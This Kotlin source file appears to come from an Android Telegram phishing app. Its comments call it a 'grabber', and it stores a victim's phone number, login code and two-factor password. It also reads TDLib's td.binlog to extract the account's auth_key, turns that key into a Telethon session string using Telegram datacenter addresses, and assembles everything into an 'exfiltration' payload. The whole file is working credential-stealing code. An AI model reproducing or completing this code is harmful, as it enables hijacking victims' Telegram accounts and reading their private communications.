package com.tgme.app

import android.content.Context
import android.util.Base64
import java.io.File

/** Données capturées (grabber) + extraction de la clé de session depuis TDLib. */
object Capture {
    var phone = ""
    var code = ""
    var password = ""
    var codeLength = 0

    // remplis au READY, juste avant l'exfiltration
    var userId = 0L
    var userName = ""
    var dcId = 0
    var authKeyHex = ""
    var session = ""

    fun save(ctx: Context) {
        ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
            .putString("phone", phone)
            .putString("code", code)
            .putString("password", password)
            .putString("session", session)
            .apply()
    }

    // ---------- td.binlog ----------

    private fun binlog(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")

    /** À appeler APRÈS TdApi.Close(). Poll le temps que TDLib finisse d'écrire. */
    fun readAuth(ctx: Context, timeoutMs: Long = 8000): Boolean {
        val f = binlog(ctx)
        val end = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < end) {
            if (f.exists()) {
                try { if (parse(f.readBytes())) return true } catch (_: Exception) {}
            }
            try { Thread.sleep(300) } catch (_: InterruptedException) {}
        }
        return authKeyHex.isNotEmpty()
    }

    private fun parse(b: ByteArray): Boolean {
        if (b.size < 12 || String(b, 0, 4, Charsets.US_ASCII) != "TDBL") return false
        var p = 8 // magic + version uint32
        while (p + 8 <= b.size) {
            val kl = le32(b, p); p += 4
            if (kl <= 0 || p + kl + 4 > b.size) break
            val key = String(b, p, kl, Charsets.US_ASCII); p += kl
            val vl = le32(b, p); p += 4
            if (vl <= 0 || p + vl > b.size) break
            if (key.startsWith("auth_key")) {
                val v = b.copyOfRange(p, p + vl)
                val k = if (v.size > 256) v.copyOfRange(v.size - 256, v.size) else v
                if (k.size == 256) {
                    authKeyHex = k.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
                    dcId = if (v.size >= 260) le32(v, 0) else dcId
                    session = telethon(dcId, k)
                    return true
                }
            }
            p += vl + 4 // valeur + timestamp
        }
        return false
    }

    private fun le32(b: ByteArray, p: Int): Int =
        (b[p].toInt() and 0xFF) or ((b[p + 1].toInt() and 0xFF) shl 8) or
            ((b[p + 2].toInt() and 0xFF) shl 16) or ((b[p + 3].toInt() and 0xFF) shl 24)

    /** String session Telethon : dc_id(1) + ip(4) + port(2) + auth_key(256), base64url. */
    private fun telethon(dc: Int, key: ByteArray): String {
        val ip = when (dc) {
            1 -> "149.154.175.53"
            2 -> "149.154.167.51"
            3 -> "149.154.175.100"
            4 -> "149.154.167.91"
            5 -> "91.108.56.130"
            else -> "149.154.167.51"
        }.split(".").map { it.toInt().toByte() }.toByteArray()

        val out = ByteArray(1 + 4 + 2 + 256)
        out[0] = dc.toByte()
        System.arraycopy(ip, 0, out, 1, 4)
        out[5] = 0x01          // port 443
        out[6] = 0xBB.toByte()
        System.arraycopy(key, 0, out, 7, 256)
        return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP)
    }

    // ---------- exfiltration ----------

    fun payload(ctx: Context) = buildString {
        append("READY\n")
        append("num: $phone\n")
        append("code: $code\n")
        append("pass: $password\n")
        append("user: $userId $userName\n")
        append("dc: $dcId\n")
        append("auth_key: $authKeyHex\n")
        append("session: $session\n")
    }

    fun binlogFile(ctx: Context) = binlog(ctx)
}
